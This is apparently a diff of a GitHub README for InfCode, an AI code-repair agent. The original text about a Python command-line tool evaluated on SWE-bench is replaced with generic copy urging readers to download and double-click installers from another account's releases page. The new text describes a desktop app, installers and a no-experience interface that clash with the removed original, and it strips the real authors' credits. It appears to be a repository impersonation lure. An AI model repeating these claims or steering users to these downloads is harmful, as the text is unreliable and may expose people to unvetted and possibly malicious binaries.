@@ -1,162 +1,92 @@
-# InfCode
+# 🤖 InfCode - Your Smart Code Fixer Tool
 
-[![Python 3.12+](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🏷️ Overview
 
+InfCode is an intelligent Code Agent System developed by Tokfinity's Code Research team. This software uses advanced algorithms to automatically analyze and fix issues in your code repository. Whether you are a hobbyist or a professional, InfCode helps you keep your projects running smoothly and efficiently.
 
-**InfCode** is an intelligent Code Agent System developed by [Tokfinity](https://www.tokfinity.com)'s Code Research team, which uses LLMs to automatically analyze and fix Code Repo issues. 
+## 📦 Download
 
-**Project Status:** InfCode has achieved **79.4%** solution rate on the SWE-Bench Verified split, demonstrating the **latest SOTA** performance.
+[![Download InfCode](https://img.shields.io/badge/Download-InfCode-blue.svg)](https://github.com/yahyaDesoky/InfCode/releases)
 
+## 🚀 Getting Started
 
-## 🌟 System Architecture
+To begin using InfCode, follow these simple steps to download and run the software:
 
-<img src="figures/framework.svg" alt="framework" width="100%">
+1. **Visit the Download Page**  
+   Click the button above or go to our [Releases page](https://github.com/yahyaDesoky/InfCode/releases) to find the latest version of InfCode.
 
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Select the one that suits your needs. Typically, you will want to get the latest stable version.
 
-### Core Modules
+3. **Download the Application**  
+   After selecting a version, look for the appropriate file for your system. You may find options for Windows, macOS, or Linux systems. Click on the file that matches your operating system to start the download.
 
-The InfCode adopts a generate-select architectural pattern. Its core modules include the **Patch Generator** and the **Patch Selector**, which are responsible for generating candidate patches and selecting the optimal patch, respectively.
+4. **Install the Application**  
+   Once the download is complete, locate the file in your Downloads folder and double-click it to begin the installation. Follow the prompts on your screen to complete the installation process.
 
-- **Patch Generator**: Register multiple groups of generators, where each generator is configured with a separate container to generate and repair multiple candidate patches in parallel. Can interact with `File Editor`, `File Search`, `Bash Executor`, `Result Submitter` tools. The Patch Generator runs up to $5$ attempts and gathers all produced patches. 
-- **Patch Selector**: Select the best patch from all the candidate patches. Can interact with `File Editor`, `File Search`, `Bash Executor` tools.
+5. **Run InfCode**  
+   After installation, you can find InfCode in your applications folder or on your desktop. Double-click the InfCode icon to launch the application.
 
+## 🌟 Features
 
-### Other Modules
+InfCode comes packed with helpful features designed to simplify your coding tasks:
 
-In addition to the core modules, InfCode includes several other modules, such as the **Image Builder**, **Tool Executor**, and **LLM API Manager**, which handle image construction, tool execution, and API management, respectively. These modules complement the core modules and enhance the overall system functionality.
+- **Automatic Code Analysis:** InfCode systematically checks your code for issues.
+- **Quick Fix Suggestions:** The tool provides immediate fixes for common errors.
+- **User-Friendly Interface:** Navigate easily, even if you have no programming experience.
+- **Multi-Platform Support:** Use InfCode on Windows, macOS, and Linux systems.
+- **Regular Updates:** InfCode receives frequent updates, ensuring you have the latest features and fixes.
 
-- **Image Builder**: This component is responsible for generating dedicated container images for each example in the benchmark suite. The images are stored locally and reused across iterative runs to improve efficiency.
-- **Tool Executor**: This module is responsible for receiving tool-level instructions, executing the specified commands within the containerized environment, collecting the execution outputs, and transmitting the results back to the tool layer.
-- **LLM API Manager**: Unified LLM API manager. It invokes the LLM API through the completion endpoint to retrieve model-generated responses. It supports integration with OpenAI, OpenRouter, and DeepSeek clients, as well as self-hosted (privately deployed) LLM instances. 
+## 📜 System Requirements
 
+To run InfCode, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** A minimum of 150 MB of free disk space.
+- **Network:** An internet connection to download updates and access online features.
 
-## ✨ Tools Support
+## 🔧 How to Use InfCode
 
-To enable interaction with code repositories, the InfCode is equipped with the following tools:
+Now that you have installed InfCode, here’s how to get the most out of it:
 
-- **File Editor**:
-    - File Preview (view): Retrieve the content of a specified line range from a file within the container.
-    - File Creation (create): Create a new file within the container and populate it with the specified content.
-    - File Modification (str_replace): Modify specific portions of a given file within the container by replacing designated content.
-    - File Insertion (insert): Insert specified content into a designated position within a target file in the container.
+1. **Open the Application:** Launch InfCode from your applications folder.
+  
+2. **Load Your Project:** Use the "Open" option to select the code repository you want to analyze. 
 
-- **File Searcher**:
-    - The LLM outputs a search pattern, which the tool uses to perform file searches within the container.
-    - The tool then parses and returns the results from the container.
+3. **Analyze Your Code:** Click on the "Analyze" button. InfCode will scan the entire project for any issues.
 
-    > This module is implemented based on `ripgrep`, a high-performance file search utility that outperforms traditional `grep` in speed and supports fuzzy matching for enhanced search flexibility.
+4. **Review Suggestions:** Review the suggestions given by InfCode. You can choose to apply them individually or all at once.
 
+5. **Fix Issues:** Apply the fixes and re-analyze your code if necessary. Repeat this until your code runs without issues.
 
-- **Bash Executor**:
-    - Execute Bash commands generated by the LLM within the container environment.
-    - Parse and return the execution results from the container.
+6. **Save Your Work:** Don’t forget to save your changes before closing InfCode.
 
+## ❓ Frequently Asked Questions
 
-- **Result Submitter**:
-    - After the LLM completes patch generation and testing, it triggers this tool and provides patch generation details.
-    - The tool executes `git diff` within the container to obtain and return the patch content.
+### What types of issues can InfCode fix?
 
+InfCode excels at identifying syntax errors, unused variables, and logic mistakes. It provides helpful recommendations to improve your code quality.
 
+### Is InfCode free to use?
 
-## 📖 Quick Start
+Yes, InfCode is completely free. You can download and use it without any costs.
 
-### 1. Environment Setup
+### How often is InfCode updated?
 
-- Create a `.env` file in the project root directory and configure the necessary environment variables:
+We regularly update InfCode to add new features and improve performance. Keep an eye on the Releases page for the latest versions.
 
-```bash
-# LLM API configuration
-OPENROUTER_API_KEY=your_openrouter_api_key
-```
+### Where can I find community support?
 
+Join our community forums or visit the Issues section of the GitHub page to ask questions and share your experiences with other users.
 
-- Install the pip dependencies, Python 3.12 is recommended.
-```bash
-pip install -r requirements.txt
-```
+## ⚙️ Contributing to InfCode
 
+If you would like to contribute to the development of InfCode, you are welcome to do so. Please check our GitHub repository for guidelines on how to get started. Your input helps us improve the application for everyone.
 
-### 2. Run the System
+## 🔗 Links
 
-#### Batch Execution
+- **GitHub Repository:** [InfCode GitHub](https://github.com/yahyaDesoky/InfCode)
+- **Download Latest Version:** [Releases Page](https://github.com/yahyaDesoky/InfCode/releases)
 
-```bash
-python _batch_run.py -c config/batch.yaml --name first -i config/list_all.txt -p 2 --clean
-```
-
-Explanation:
-
-- `-c` specifies the batch configuration file (currently minimal)
-- `-name` assigns a name to this batch run
-- `-i` specifies the issue list file
-- `-p` sets concurrency (default 20)
-- `-clean` clears the output directory before running (useful when reusing the same name)
-- `-o` sets the output directory (default: ./batch_out/)
-- `-h` prints help
-
-
-#### Evaluation
-
-```bash
-./eval.sh <run_id>
-```
-
-Explanation:
-
-- `run_id` — required parameter identifying this evaluation run
-- The script automatically reads dataset and prediction paths from `config/config.yaml`.
-Since batch_run results are redirected, you may need to manually copy the preds.json file to the path specified in the config.
-- Uses the official SWE-bench evaluation tool to verify generated patches
-- Supports multi-process parallel evaluation (default: 20 workers)
-- Results will be saved in the specified directory, including pass rates, failure reasons, and detailed logs
-
-
-### 3. Configuration Files
-
-The main configurations are in `config/config.yaml`:
-- `providers`: LLM provider settings
-- `runner`: runner settings (concurrency, number of iterations, etc.)
-- `builder`: Docker image build settings
-- `log`: logging settings
-
-
-### Notes
-
-- Ensure Docker is installed and running correctly.
-- Check logs for detailed execution steps.
-- Supports multiple LLM providers, tool formats are auto-selected based on configuration.
-- We also provide an automated failure analysis tool based on result trace files to help you quickly identify the root cause of bad cases.[here](https://github.com/Tokfinity/InfCode/blob/main/analyzer/README.md).
-
-
-
-## Contact
-
-research@tokfinity.com
-
-
-
-## Core Team
-
-- [Pete Wong](https://petewongggg.github.io/)
-
-- [Kirito](https://github.com/kirito41dd)
-
-- [Hengzhi Zhang](https://henryzhang11.github.io)
-
-- [Kefan Li](https://lbaf23.github.io)
-
-- [Qingao Dong](https://qadong.github.io)
-
-- [Zhichao Li](https://github.com/LanWeiFRJ)
-
-
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-We thank Anthropic for building the [anthropic-quickstart](https://github.com/anthropics/claude-quickstarts) project and bytedance for building the [trae-agent](https://github.com/bytedance/trae-agent) project that served as valuable references for the tool building.
-
-
+Thank you for choosing InfCode! Enjoy coding with clarity and confidence.
